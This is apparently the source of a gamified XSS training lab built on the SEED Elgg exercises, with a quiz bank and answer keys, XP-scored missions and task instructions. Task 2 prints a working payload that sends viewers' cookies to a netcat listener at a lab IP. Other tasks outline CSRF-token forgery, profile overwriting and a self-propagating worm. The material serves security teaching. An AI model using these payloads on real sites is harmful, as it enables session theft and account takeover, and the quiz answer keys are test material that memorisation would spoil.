const { useState, useEffect, useRef, useCallback, useMemo } = React;

  // ── DESIGN TOKENS (THEME AWARE) ────────────────────────────────────────────────
  const THEMES = {
    dark: {
      bg:'#0d1117', bgSec:'#161b22', bgCard:'#1c2333', bgHov:'#21262d',
      border:'#30363d', border2:'#21262d', text:'#e6edf3', muted:'#8b949e',
      faint:'#6e7681', accent:'#00d4aa', accentHov:'#00bda0',
      accentDim:'rgba(0,212,170,0.15)', blue:'#58a6ff', purple:'#bc8cff',
      green:'#3fb950', red:'#f85149', yellow:'#d29922',
    },
    light: {
      bg:'#f6f8fa', bgSec:'#ffffff', bgCard:'#f0f3f6', bgHov:'#e6ecf3',
      border:'#b0bbc8', border2:'#c8d3dc', text:'#0d1117', muted:'#24292f',
      faint:'#3d444d', accent:'#0a6a2a', accentHov:'#044f1e',
      accentDim:'rgba(10,106,42,0.12)', blue:'#0550ae', purple:'#6a1a99',
      green:'#0a6a2a', red:'#c01616', yellow:'#7d5a00',
    }
  };

  // Get current theme
  function getTheme(isDark) {
    return isDark ? THEMES.dark : THEMES.light;
  }
  const C = getTheme(true); // Will be replaced by actual theme in component

  // ── QUESTION BANK ─────────────────────────────────────────────────────────────
  const ALL_QUESTIONS = [
    {id:'q_t1_1', task:1, type:'mcq',
    q:'Which HTML tag is used to embed JavaScript directly inside a web page for a stored XSS attack?',
    options:['A) <div>','B) <script>','C) <style>','D) <iframe>'],
    answer:'B',
    explanation:'The <script> tag tells the browser to execute its content as JavaScript. Stored XSS injects this tag into a database field so every user loading that page runs the attacker\'s code.'},
    {id:'q_t1_2', task:1, type:'mcq',
    q:'What JavaScript property exposes all cookies set for the current origin in the browser?',
    options:['A) window.storage','B) navigator.cookies','C) document.cookie','D) location.cookies'],
    answer:'C',
    explanation:'document.cookie returns a semicolon-separated string of all cookies accessible to the current page. This is exactly what alert(document.cookie) displays in Task 1.2.'},
    {id:'q_t1_3', task:1, type:'mcq',
    q:'In Task 1.1 you injected <script>alert(\'XSS\');</script> into the Brief Description field. Why does the alert fire in Alice\'s browser, NOT in Samy\'s browser when Samy saves the profile?',
    options:['A) The Brief Description is only rendered on other users\' screens','B) Samy\'s browser sanitises its own profile','C) alert() is blocked for the profile owner','D) The script only runs once per IP address'],
    answer:'A',
    explanation:'Stored XSS fires when a *victim* renders the stored payload. When Samy saves the profile the server stores the raw HTML; when Alice\'s browser fetches and renders Samy\'s profile, it encounters and executes the script.'},
    {id:'q_t1_4', task:1, type:'scenario',
    q:'Scenario: A student injects <script>alert(\'XSS\');</script> into the About Me field using the TinyMCE Editor (NOT Edit HTML mode). The alert does NOT fire when Alice views the profile. What is the most likely reason?',
    options:['A) The netcat listener was not running','B) TinyMCE sanitised or escaped the script tag before saving','C) Alice\'s session cookie is HttpOnly','D) The payload needs to be in the Brief Description field only'],
    answer:'B',
    explanation:'WYSIWYG editors like TinyMCE sanitise HTML before storing it. That renders the script harmless. This is why the lab instructs you to click "Edit HTML" — it bypasses the editor and saves raw HTML.'},
    {id:'q_t1_5', task:1, type:'mcq',
    q:'What attribute of the <script> tag lets you load JavaScript from an external server?',
    options:['A) href','B) link','C) src','D) data'],
    answer:'C',
    explanation:'The src attribute specifies a URL from which the browser fetches and executes JavaScript.'},
    {id:'q_t2_1', task:2, type:'mcq',
    q:'What HTTP method does the browser use when fetching the src URL of an <img> tag?',
    options:['A) POST','B) GET','C) PUT','D) DELETE'],
    answer:'B',
    explanation:'Browsers always use an HTTP GET request to load any embedded resource. This is why the cookie-steal payload works: the img src triggers a GET carrying the cookie in the query string.'},
    {id:'q_t2_2', task:2, type:'mcq',
    q:'In Task 2, why must you run "nc -lknv 5555" BEFORE Alice visits Samy\'s profile?',
    options:['A) nc needs to pre-register the port with the OS','B) The browser will only send one request; if no listener is ready it is lost','C) The payload checks whether port 5555 is open before injecting the img tag','D) Elgg validates that the img src is reachable before storing the payload'],
    answer:'B',
    explanation:'When Alice\'s browser fires the GET request to port 5555 the TCP connection either succeeds or fails silently. There is no retry mechanism. Starting nc first ensures the connection is accepted and the cookie printed.'},
    {id:'q_t2_3', task:2, type:'mcq',
    q:'Why is escape() applied to document.cookie before embedding it in the img src URL?',
    options:['A) To encrypt the cookie so the attacker can read it','B) To compress the cookie for faster transmission','C) To percent-encode special characters like = and ; so they survive inside a URL query string','D) Elgg blocks requests that contain the word "cookie"'],
    answer:'C',
    explanation:'Cookies contain characters such as =, ;, and spaces that have special meaning in URLs. escape() converts them to %XX sequences so the full cookie value is transmitted intact.'},
    {id:'q_t2_4', task:2, type:'scenario',
    q:'Scenario: You inject the cookie-steal payload and Alice visits the profile, but the netcat terminal shows only "GET /?c= HTTP/1.1" with an empty cookie value. What is the most likely cause?',
    options:['A) The Elgg session cookie is marked HttpOnly so JavaScript cannot read it','B) Alice is not logged in so she has no cookie','C) The netcat port is wrong','D) The img tag was blocked by the CSP header'],
    answer:'A',
    explanation:'HttpOnly cookies are invisible to JavaScript — document.cookie returns an empty string for them. In the SEED lab this flag is disabled so the attack works.'},
    {id:'q_t2_5', task:2, type:'mcq',
    q:'What does the -k flag do in "nc -lknv 5555"?',
    options:['A) Encrypts the connection with a key','B) Keeps the listener alive after the first connection closes','C) Limits connections to localhost only','D) Kills existing processes on port 5555'],
    answer:'B',
    explanation:'Without -k, netcat exits after the first client disconnects. The -k flag makes nc restart and listen again after each connection.'},
    {id:'q_t3_1', task:3, type:'mcq',
    q:'Lines 1–2 of the Task 3 payload read elgg.security.token.__elgg_ts and __elgg_token. What security mechanism do these values belong to?',
    options:['A) HTTP Basic Authentication','B) CSRF token validation','C) Content Security Policy nonce','D) JSON Web Token (JWT)'],
    answer:'B',
    explanation:'Elgg implements CSRF protection using a synchronizer token pattern. The XSS payload reads them from the victim\'s live page context so the forged request looks legitimate.'},
    {id:'q_t3_2', task:3, type:'mcq',
    q:'Which HTTP method does the Elgg /action/friends/add endpoint use?',
    options:['A) POST','B) PUT','C) GET','D) PATCH'],
    answer:'C',
    explanation:'The add-friend action is triggered by a GET request: /action/friends/add?friend=59&__elgg_ts=...&__elgg_token=...'},
    {id:'q_t3_3', task:3, type:'scenario',
    q:'Scenario: Samy\'s About Me contains the Task 3 friend-add payload. Samy logs in and views his own profile. What happens?',
    options:['A) Samy is added to his own friends list','B) Nothing harmful — the guard checks prevent self-execution','C) The payload executes for Samy exactly as it would for Alice','D) An error is thrown because Samy\'s guid matches the friend parameter'],
    answer:'C',
    explanation:'The Task 3 payload has NO self-exclusion guard. window.onload fires for every viewer including Samy. The GET request fires and tries to add guid 59 (Samy) to Samy\'s friend list.'},
    {id:'q_t3_4', task:3, type:'mcq',
    q:'Where can you find Samy\'s numeric GUID in this simulator?',
    options:['A) In the <title> tag','B) Shown directly in the Members sidebar next to each username','C) In the Elgg login form','D) In the browser\'s Local Storage'],
    answer:'B',
    explanation:'In this simulator, each user\'s GUID is displayed directly in the Members sidebar. Samy\'s GUID is 59, which is hardcoded into the payload.'},
    {id:'q_t3_5', task:3, type:'scenario',
    q:'Scenario: The Elgg application is updated so that "About Me" only offers a visual Editor with no "Edit HTML" option. Can you still launch the Task 3 attack?',
    options:['A) No — without Edit HTML the script tag is always sanitised','B) Yes — use the Brief Description field, which accepts raw HTML','C) Yes — paste the payload into the Display Name field','D) No — XSS requires server-side vulnerability not client-side editor'],
    answer:'B',
    explanation:'The Brief Description field does NOT pass through TinyMCE\'s sanitiser. You can paste a <script> payload there and it will be stored and executed.'},
    {id:'q_t4_1', task:4, type:'mcq',
    q:'Task 4 uses HTTP POST instead of GET. What key header must be set so Elgg parses the POST body correctly?',
    options:['A) Content-Type: application/json','B) Content-Type: text/plain','C) Content-Type: application/x-www-form-urlencoded','D) Accept: text/html'],
    answer:'C',
    explanation:'Elgg\'s profile-edit action expects form data. Without this header the body is ignored and the profile is not updated.'},
    {id:'q_t4_2', task:4, type:'mcq',
    q:'Why does Task 4\'s payload contain "if(elgg.session.user.guid != samyGuid)"?',
    options:['A) To prevent Samy\'s own profile from being overwritten when he views it','B) To check that Alice is logged in before modifying her profile','C) To avoid triggering Elgg\'s rate limiter','D) To ensure the CSRF token is valid before sending'],
    answer:'A',
    explanation:'Without the guard, whenever Samy visits his own profile the script fires a POST that overwrites his own About Me with the encoded worm code, corrupting the payload.'},
    {id:'q_t4_3', task:4, type:'scenario',
    q:'Scenario: You remove Line 1 (the samyGuid guard) from the Task 4 payload, then Samy views his own profile. What happens next?',
    options:['A) Nothing — the browser blocks self-modification','B) Samy\'s About Me is overwritten with "Samy is my hero!" by a POST from his own session','C) An infinite loop overwrites the profile hundreds of times','D) The CSRF token mismatch causes the request to fail'],
    answer:'B',
    explanation:'Without the guard the script executes for every viewer including Samy. The POST fires using Samy\'s own session credentials and overwrites his About Me.'},
    {id:'q_t4_4', task:4, type:'mcq',
    q:'The POST body in Task 4 includes "accesslevel[description]=2". What does access level 2 typically mean in Elgg?',
    options:['A) Administrators only','B) Friends only','C) Public (visible to everyone)','D) Private (only the owner)'],
    answer:'C',
    explanation:'In Elgg\'s access control system, access level 2 corresponds to "Public", making the modified description visible to all users.'},
    {id:'q_t5_1', task:5, type:'mcq',
    q:'Which DOM API method does the Task 5 worm use to retrieve a copy of its own source code from the page?',
    options:['A) document.querySelector("#worm").textContent','B) document.getElementById("worm").innerHTML','C) window.getScript("worm")','D) document.scripts[0].src'],
    answer:'B',
    explanation:'The worm gives its own <script> tag the attribute id="worm". Then document.getElementById("worm").innerHTML retrieves the worm\'s JavaScript body.'},
    {id:'q_t5_2', task:5, type:'mcq',
    q:'Why is encodeURIComponent() applied to the worm code before embedding it in the POST body?',
    options:['A) To compress the worm for faster transmission','B) To obfuscate the worm from IDS systems','C) To percent-encode characters like < > " & that would break the form-urlencoded body','D) Elgg only accepts base64-encoded descriptions'],
    answer:'C',
    explanation:'The worm code contains <script>, </script>, quotes, and ampersands. encodeURIComponent() converts them to %3C, %3E, %22, %26 etc.'},
    {id:'q_t5_3', task:5, type:'scenario',
    q:'Scenario: After Charlie visits Alice\'s infected profile, Charlie\'s profile is still empty. Worm propagation failed. What is the most likely reason?',
    options:['A) Charlie\'s GUID is 57 which is excluded by the samyGuid check','B) The worm code stored in Alice\'s profile is double-encoded, so the script tag is broken','C) The worm only propagates to users who are friends with Samy','D) Charlie must view the profile while Samy is logged in'],
    answer:'B',
    explanation:'Double-encoding is the classic worm propagation bug. The script tags become %253C which the browser does not recognise as a script tag.'},
    {id:'q_t5_4', task:5, type:'mcq',
    q:'The real Samy Worm infected over one million MySpace users. Approximately how long did it take?',
    options:['A) 3 days','B) 6 hours','C) Under 20 hours','D) 2 weeks'],
    answer:'C',
    explanation:'Released on October 4, 2005, the Samy Worm infected over one million MySpace profiles in under 20 hours, making it one of the fastest-spreading pieces of malware ever recorded.'},
    {id:'q_t5_5', task:5, type:'scenario',
    q:'Scenario: The worm payload in Samy\'s profile propagates to Alice. But when Charlie visits Samy\'s profile directly (not Alice\'s), Charlie\'s profile is NOT infected. Why might this be expected for demonstrating chain propagation?',
    options:['A) The worm only infects users via Alice, not via Samy','B) Charlie\'s profile is already infected','C) Samy\'s profile would also infect Charlie via a separate path','D) The task requires Charlie to visit ALICE\'s infected profile to demonstrate chain propagation'],
    answer:'D',
    explanation:'The point of Task 5 is chain propagation: Samy→Alice→Charlie. Charlie visiting Alice\'s profile proves the worm spread beyond Samy.'},
    {id:'q_t6_1', task:6, type:'mcq',
    q:'What does the CSP directive "default-src \'self\'" mean?',
    options:['A) Only HTTPS resources from any domain are allowed','B) Resources may only be loaded from the same origin as the document','C) All inline scripts are allowed','D) Scripts from any subdomain of the current domain are allowed'],
    answer:'B',
    explanation:'\'self\' refers to the exact origin (scheme + host + port) of the current page. default-src \'self\' means no resource can be loaded from any external domain.'},
    {id:'q_t6_2', task:6, type:'mcq',
    q:'Which CSP mechanism allows a SINGLE trusted inline script to execute without enabling "unsafe-inline" for all scripts?',
    options:['A) script-src \'self\'','B) A nonce (nonce-111-111-111)','C) X-Frame-Options header','D) SameSite cookie attribute'],
    answer:'B',
    explanation:'A nonce is a random value added to the CSP header. A script tag with the matching nonce attribute is allowed to execute; all other inline scripts are blocked.'},
    {id:'q_t6_3', task:6, type:'scenario',
    q:'Scenario: example32b has CSP "default-src \'self\'; script-src \'self\' *.example70.com". Alice injects <script>alert(document.cookie);</script> into a page on example32b. What happens when Bob visits?',
    options:['A) The alert fires normally','B) The browser blocks the inline script and logs a CSP violation — no alert fires','C) The CSP only blocks external scripts, so inline scripts still run','D) The script runs but document.cookie is empty'],
    answer:'B',
    explanation:'CSP\'s script-src without \'unsafe-inline\' blocks ALL inline scripts including injected ones. The browser checks the script origin and blocks it.'},
    {id:'q_t6_4', task:6, type:'mcq',
    q:'What is the correct single script-src directive that allows BOTH example60.com and example70.com?',
    options:['A) Two separate script-src lines: one for each domain','B) script-src \'self\' *.example60.com *.example70.com on ONE line','C) script-src *.example60.com; script-src *.example70.com','D) allow-src *.example60.com *.example70.com'],
    answer:'B',
    explanation:'In HTTP headers the last occurrence of a directive wins, so two script-src lines mean only the second takes effect. All trusted sources must be listed on a SINGLE script-src directive.'},
    {id:'q_t6_5', task:6, type:'scenario',
    q:'Scenario: A developer says "We added input sanitisation on the server, so we don\'t need CSP." Is this correct?',
    options:['A) Yes — server-side sanitisation is sufficient and CSP is redundant','B) No — sanitisation can have gaps; CSP is a defence-in-depth layer that blocks script execution even if injection occurs','C) Yes — CSP only helps against third-party script loading, not XSS','D) No — CSP replaces sanitisation and you should remove sanitisation if CSP is enabled'],
    answer:'B',
    explanation:'Defence in depth: sanitisation tries to prevent injection, but CSP acts as a second layer. Even if an attacker injects a script tag, the browser\'s CSP policy prevents execution.'},
  ];

  function seededRng(seed) {
    let s = seed;
    return () => { s = (s * 1664525 + 1013904223) & 0xffffffff; return (s >>> 0) / 4294967296; };
  }
  function seededShuffle(arr, seed) {
    const rng = seededRng(seed);
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(rng() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  }
  function strToSeed(s) {
    let h = 5381;
    for (let i = 0; i < s.length; i++) h = ((h << 5) + h) ^ s.charCodeAt(i);
    return h >>> 0;
  }
  function pickQuestionsForStudent(studentName) {
    const seed = strToSeed(studentName || 'default');
    const byTask = {};
    ALL_QUESTIONS.forEach(q => { if (!byTask[q.task]) byTask[q.task] = []; byTask[q.task].push(q); });
    const result = [];
    const taskSeeds = [seed, seed^0xdeadbeef, seed^0xcafebabe, seed^0x12345678, seed^0xabcdef01, seed^0x99887766];
    [1,2,3,4,5,6].forEach((t, i) => {
      const pool = byTask[t] || [];
      const shuffled = seededShuffle(pool, taskSeeds[i]);
      result.push(...shuffled.slice(0, 3));
    });
    return result;
  }

  // ── QUIZ PANEL ────────────────────────────────────────────────────────────────
  function QuizPanel({ studentName, quizAnswers, setQuizAnswers, quizScore, setQuizScore }) {
    const questions = useMemo(() => pickQuestionsForStudent(studentName), [studentName]);
    const [selected, setSelected] = useState({});
    const [submitted, setSubmitted] = useState({});
    const [filter, setFilter] = useState(0);

    const handleSubmit = (qid) => {
      if (!selected[qid] || submitted[qid]) return;
      const q = questions.find(x => x.id === qid);
      const correct = selected[qid] === q.answer;
      setSubmitted(p => ({ ...p, [qid]: true }));
      if (correct && !quizAnswers[qid]) {
        setQuizAnswers(p => ({ ...p, [qid]: true }));
        setQuizScore(s => s + 15);
      }
    };

    const filtered = filter === 0 ? questions : questions.filter(q => q.task === filter);
    const total = questions.length;
    const done = Object.keys(quizAnswers).length;
    const pct = total > 0 ? Math.round((done / total) * 100) : 0;
    const typeColors = { mcq: C.blue, scenario: C.purple };
    const typeLabels = { mcq: 'MCQ', scenario: 'Scenario' };

    return (
      <div style={{ height:'100%', display:'flex', flexDirection:'column', background:C.bg, fontFamily:'system-ui,sans-serif', overflow:'hidden' }}>
        <div style={{ background:C.bgSec, borderBottom:`1px solid ${C.border}`, padding:'12px 16px', flexShrink:0 }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:10 }}>
            <div>
              <div style={{ fontSize:14, fontWeight:800, color:'#fff' }}>📝 Lab Quiz</div>
              <div style={{ fontSize:11, color:C.muted, marginTop:2 }}>Personalised for <strong style={{ color:C.accent }}>{studentName}</strong> · {done}/{total} answered · <strong style={{ color:C.accent }}>{quizScore} XP</strong> earned</div>
            </div>
            <div style={{ textAlign:'right' }}>
              <div style={{ fontSize:10, color:C.faint, marginBottom:3 }}>{pct}% complete</div>
              <div style={{ width:120, height:5, background:C.border2, borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', width:`${pct}%`, background:C.accent, borderRadius:99, transition:'width 0.4s' }} />
              </div>
            </div>
          </div>
          <div style={{ display:'flex', gap:5, flexWrap:'wrap' }}>
            {[0,1,2,3,4,5,6].map(t => (
              <button key={t} onClick={() => setFilter(t)}
                style={{ padding:'3px 10px', borderRadius:20, border:`1px solid ${filter===t?C.accent:C.border}`, background:filter===t?'rgba(0,212,170,0.12)':'transparent', color:filter===t?C.accent:C.muted, fontSize:10, fontWeight:filter===t?700:400, cursor:'pointer', fontFamily:'inherit' }}>
                {t === 0 ? 'All Tasks' : `Task ${t}`}
              </button>
            ))}
          </div>
        </div>
        <div style={{ flex:1, overflowY:'auto', padding:16, display:'flex', flexDirection:'column', gap:14 }}>
          {filtered.map((q) => {
            const isSubmitted = submitted[q.id];
            const userAns = selected[q.id];
            const isCorrect = isSubmitted && userAns === q.answer;
            const isWrong = isSubmitted && userAns !== q.answer;
            const alreadyCorrect = quizAnswers[q.id];
            return (
              <div key={q.id} style={{ background: alreadyCorrect ? 'rgba(0,212,170,0.05)' : C.bgSec, border: `1px solid ${alreadyCorrect ? 'rgba(0,212,170,0.3)' : isWrong ? 'rgba(248,81,73,0.3)' : C.border}`, borderRadius:12, padding:16 }}>
                <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:10 }}>
                  <span style={{ fontSize:9, fontWeight:700, padding:'2px 7px', borderRadius:99, background:`${typeColors[q.type]}18`, color:typeColors[q.type], textTransform:'uppercase', letterSpacing:1 }}>{typeLabels[q.type]}</span>
                  <span style={{ fontSize:9, padding:'2px 7px', borderRadius:99, background:'rgba(255,255,255,0.04)', color:C.faint, border:`1px solid ${C.border}` }}>Task {q.task}</span>
                  {alreadyCorrect && <span style={{ fontSize:11, color:C.accent, marginLeft:'auto' }}>✓ +15 XP</span>}
                  {isWrong && <span style={{ fontSize:11, color:C.red, marginLeft:'auto' }}>✗ Try again</span>}
                </div>
                <div style={{ fontSize:13, fontWeight:600, color:'#fff', lineHeight:1.55, marginBottom:12 }}>{q.q}</div>
                <div style={{ display:'flex', flexDirection:'column', gap:7 }}>
                  {q.options.map(opt => {
                    const letter = opt[0];
                    const isSelected = userAns === letter;
                    const isCorrectOpt = isSubmitted && letter === q.answer;
                    const isWrongSelected = isSubmitted && isSelected && letter !== q.answer;
                    let bg = 'rgba(255,255,255,0.03)', border = C.border, col = C.muted;
                    if (isCorrectOpt) { bg = 'rgba(63,185,80,0.12)'; border = 'rgba(63,185,80,0.5)'; col = C.green; }
                    else if (isWrongSelected) { bg = 'rgba(248,81,73,0.1)'; border = 'rgba(248,81,73,0.4)'; col = C.red; }
                    else if (!isSubmitted && isSelected) { bg = 'rgba(88,166,255,0.1)'; border = 'rgba(88,166,255,0.4)'; col = C.blue; }
                    return (
                      <button key={letter} disabled={isSubmitted || alreadyCorrect}
                        onClick={() => !isSubmitted && !alreadyCorrect && setSelected(p => ({ ...p, [q.id]: letter }))}
                        style={{ textAlign:'left', background:bg, border:`1px solid ${border}`, borderRadius:8, padding:'9px 13px', cursor:isSubmitted||alreadyCorrect?'default':'pointer', fontFamily:'inherit', display:'flex', alignItems:'center', gap:10 }}>
                        <span style={{ width:22, height:22, borderRadius:'50%', background:`${border}22`, border:`1px solid ${border}`, color:col, fontSize:11, fontWeight:700, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>{letter}</span>
                        <span style={{ fontSize:12, color:col, lineHeight:1.4 }}>{opt.slice(3)}</span>
                        {isCorrectOpt && <span style={{ marginLeft:'auto', color:C.green, fontSize:14 }}>✓</span>}
                        {isWrongSelected && <span style={{ marginLeft:'auto', color:C.red, fontSize:14 }}>✗</span>}
                      </button>
                    );
                  })}
                </div>
                {!isSubmitted && !alreadyCorrect && (
                  <button onClick={() => handleSubmit(q.id)} disabled={!userAns}
                    style={{ marginTop:10, background:userAns?C.accent:'rgba(255,255,255,0.05)', color:userAns?'#0d1117':C.faint, border:'none', borderRadius:8, padding:'7px 18px', cursor:userAns?'pointer':'default', fontSize:12, fontWeight:700, fontFamily:'inherit' }}>
                    Submit Answer
                  </button>
                )}
                {isSubmitted && (
                  <div style={{ marginTop:12, padding:'10px 12px', background:isCorrect?'rgba(63,185,80,0.07)':'rgba(248,81,73,0.07)', border:`1px solid ${isCorrect?'rgba(63,185,80,0.25)':'rgba(248,81,73,0.2)'}`, borderRadius:8 }}>
                    <div style={{ fontSize:11, fontWeight:700, color:isCorrect?C.green:C.red, marginBottom:5 }}>{isCorrect ? '✅ Correct!' : `❌ Incorrect — The correct answer is (${q.answer})`}</div>
                    <div style={{ fontSize:12, color:C.muted, lineHeight:1.65 }}>{q.explanation}</div>
                  </div>
                )}
                {alreadyCorrect && !isSubmitted && (
                  <div style={{ marginTop:10, padding:'8px 12px', background:'rgba(0,212,170,0.07)', border:'1px solid rgba(0,212,170,0.2)', borderRadius:8, fontSize:11, color:C.accent }}>
                    ✅ Already answered correctly — 15 XP awarded
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    );
  }

  // ── MISSION DEFINITIONS ────────────────────────────────────────────────────────
  const MISSION_STEPS = {
    task1: [
      { id:'t1_alert_inject', label:'Task 1.1 — Inject alert("XSS") into Brief Description as samy → Save', event:'elgg:alert_stored', xp:10 },
      { id:'t1_alert_victim', label:'Task 1.1 — Login as alice → Visit Samy\'s profile → alert("XSS") fires', event:'elgg:alert_triggered', xp:10 },
      { id:'t1_cookie_inject', label:'Task 1.2 — Replace payload with alert(document.cookie) → Save', event:'elgg:cookie_stored', xp:10 },
      { id:'t1_cookie_victim', label:'Task 1.2 — Login as alice → Visit Samy → cookie appears in alert', event:'elgg:cookie_triggered', xp:10 },
    ],
    task2: [
      { id:'t2_listener', label:'START FIRST: Run "nc -lknv 5555" in Terminal tab', event:'manual', xp:0 },
      { id:'t2_payload', label:'Inject <img> cookie-steal payload into Samy\'s About Me (Edit HTML must be checked)', event:'elgg:steal_stored', xp:20 },
      { id:'t2_samy',   label:'Samy refreshes own profile — cookie hits the nc listener', event:'elgg:steal_self', xp:15 },
      { id:'t2_victim', label:'Victim visits Samy\'s profile — netcat captures their cookie', event:'elgg:steal_victim', xp:25 },
    ],
    task3: [
      { id:'t3_payload', label:'Inject AJAX GET payload into About Me (Edit HTML must be checked)', event:'elgg:friend_stored', xp:25 },
      { id:'t3_victim',  label:'Victim visits Samy\'s profile — Samy auto-added to their friends', event:'elgg:friend', xp:55 },
    ],
    task4: [
      { id:'t4_payload', label:'Inject AJAX POST payload into About Me (Edit HTML must be checked)', event:'elgg:profile_stored', xp:25 },
      { id:'t4_victim',  label:'Victim visits Samy\'s profile — their profile is overwritten', event:'elgg:profile', xp:55 },
    ],
    task5: [
      { id:'t5_payload',  label:'Inject self-propagating DOM worm into Samy\'s About Me', event:'elgg:worm_stored', xp:20 },
      { id:'t5_alice',    label:'Alice visits Samy — worm copies itself to Alice\'s profile', event:'elgg:worm', xp:35 },
      { id:'t5_chain',    label:'Charlie visits Alice — worm propagates via Alice (chain spread)', event:'elgg:worm_chain', xp:45 },
    ],
    task6: [
      { id:'t6_q1', label:'Quiz: Answer Task 6 question 1', event:'question', xp:15 },
      { id:'t6_q2', label:'Quiz: Answer Task 6 question 2', event:'question', xp:15 },
      { id:'t6_q3', label:'Quiz: Answer Task 6 question 3', event:'question', xp:15 },
    ],
  };

  // ── TASK DEFINITIONS ──────────────────────────────────────────────────────────
  const TASKS = [
    {
      id:'task1', number:1, title:'Task 1: Basic XSS Injection', category:'Exploit', xp:40,
      description:'Inject JavaScript into a profile to execute code in other users\' browsers.',
      hints:[
        'Brief Description renders raw HTML — paste your script tag there.',
        'Login as a different user to see the alert execute in their browser.',
        'document.cookie exposes the viewer\'s session token.',
      ],
      content:`
  <h3>Objective</h3>
  <p>Inject JavaScript into Samy's profile. When Alice visits Samy's profile, the script executes in Alice's browser.</p>

  <h3>Steps</h3>
  <ol style="font-size:13px;line-height:1.8;color:#8b949e">
    <li><strong>Login as samy</strong> / seedsamy</li>
    <li>Click your name → <strong>Edit Profile</strong> → <strong>Brief Description</strong></li>
    <li>Paste: <code style="background:#0d1117;padding:2px 6px;border-radius:3px;color:#79c0ff">&lt;script&gt;alert('XSS');&lt;/script&gt;</code></li>
    <li>Save Profile → Logout</li>
    <li><strong>Login as alice</strong> / seedalice → Visit Samy's profile</li>
    <li>✅ Alert popup appears in Alice's browser</li>
  </ol>

  <h3>Part 2: Steal the Viewer's Cookie</h3>
  <p style="margin-top:12px;font-size:12px;color:#8b949e">Replace the alert payload with:</p>
  <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;margin:8px 0;font-family:monospace;font-size:11px;color:#79c0ff">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</div>
  <p style="font-size:12px;color:#8b949e">Save again and repeat step 5. Now Alice's session cookie is displayed.</p>
  `
    },
    {
      id:'task2', number:2, title:'Task 2: Cookie Exfiltration', category:'Exploit', xp:60,
      description:'Steal cookies by sending them to a listener via HTTP GET request.',
      hints:[
        'Start netcat in Terminal tab FIRST: nc -lknv 5555',
        'The <img> tag triggers an automatic GET request — cookies are sent in the URL.',
        'escape() URL-encodes special characters in the cookie.',
      ],
      content:`
  <h3>Objective</h3>
  <p>Send the victim's cookie to an attacker server (netcat listener) using an invisible image request.</p>

  <h3>Step 1: Start Listener</h3>
  <p>In the <strong>Terminal</strong> tab, run:</p>
  <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;margin:8px 0;font-family:monospace;font-size:11px;color:#79c0ff">nc -lknv 5555</div>
  <p style="font-size:11px;color:#8b949e;">Leave this running — it captures incoming requests.</p>

  <h3>Step 2: Inject Payload</h3>
  <ol style="font-size:13px;line-height:1.8;color:#8b949e">
    <li><strong>Login as samy</strong> → Edit Profile → <strong>About Me</strong></li>
    <li>✓ Check <strong>"Edit HTML"</strong> checkbox</li>
    <li>Paste this:</li>
  </ol>
  <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;margin:8px 0;font-family:monospace;font-size:10px;color:#79c0ff;white-space:pre-wrap">&lt;script&gt;document.write('&lt;img src=http://10.9.0.1:5555?c='+escape(document.cookie)+' &gt;');&lt;/script&gt;</div>
  <ol style="font-size:13px;line-height:1.8;color:#8b949e;margin-top:8px">
    <li style="margin-top:8px;">Save → Logout → Login as alice → Visit Samy</li>
    <li>✅ Check Terminal — Alice's cookie appears!</li>
  </ol>
  `
    },
    {
      id:'task3', number:3, title:'Task 3: Silent Friend Request', category:'Exploit', xp:80,
      description:'Use CSRF token bypass to silently add Samy as a friend.',
      hints:[
        'XSS can read elgg.security.token values from the page.',
        'Forge a GET request to /action/friends/add with the stolen tokens.',
        'Use window.onload to execute after page load.',
      ],
      content:`
  <h3>Objective</h3>
  <p>Every visitor automatically adds Samy as a friend without clicking anything.</p>

  <h3>How It Works</h3>
  <p>Friend requests are protected by CSRF tokens (__elgg_ts and __elgg_token). But XSS running in the browser can read these tokens from the page and forge a request:</p>
  <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px;margin:8px 0;font-family:monospace;font-size:10px;color:#79c0ff">/action/friends/add?friend=59&__elgg_ts=...&__elgg_token=...</div>

  <h3>Steps</h3>
  <ol style="font-size:13px;line-height:1.8;color:#8b949e">
    <li><strong>Login as samy</strong> → Edit Profile → About Me → ✓ Edit HTML</li>
    <li>Paste the Task 3 payload</li>
    <li>Save → Logout → Login as alice → Visit Samy</li>
    <li>✅ Check alice's Friends — Samy is added!</li>
  </ol>
  `
    },
    {
      id:'task4', number:4, title:'Task 4: Profile Modification', category:'Exploit', xp:80,
      description:'Forge a POST request to overwrite victim profiles with custom content.',
      hints:[
        'Use XMLHttpRequest with POST method.',
        'Set Content-Type: application/x-www-form-urlencoded',
        'Include the samyGuid guard to prevent self-overwrite.',
      ],
      content:`
  <h3>Objective</h3>
  <p>Forge a POST request to overwrite every visitor's About Me with "Samy is my hero!"</p>

  <h3>Key Difference from Task 3</h3>
  <p>Task 3 used GET. Profile edits require POST with form data and proper headers.</p>

  <h3>The samyGuid Guard</h3>
  <p style="font-size:11px;color:#8b949e">Include <code>if (elgg.session.user.guid != 59)</code> — if Samy views his own profile, the script would overwrite itself, destroying the payload. The guard prevents this.</p>

  <h3>Steps</h3>
  <ol style="font-size:13px;line-height:1.8;color:#8b949e">
    <li><strong>Login as samy</strong> → Edit Profile → About Me → ✓ Edit HTML</li>
    <li>Paste the Task 4 payload</li>
    <li>Save → Logout → Login as alice → Visit Samy</li>
    <li>✅ Check alice's profile — her About Me is now "Samy is my hero!"</li>
  </ol>
  `
    },
    {
      id:'task5', number:5, title:'Task 5: Self-Propagating Worm', category:'Exploit', xp:100,
      description:'Build a worm that copies itself into profiles and spreads exponentially.',
      hints:[
        'Give the script tag id="worm" to read its own code.',
        'Use encodeURIComponent() to wrap the worm code for POST body.',
        'Test propagation chain: Samy → Alice → Charlie',
      ],
      content:`
  <h3>Objective</h3>
  <p>Create a self-replicating worm that infects every victim's profile and spreads exponentially.</p>

  <h3>How It Works</h3>
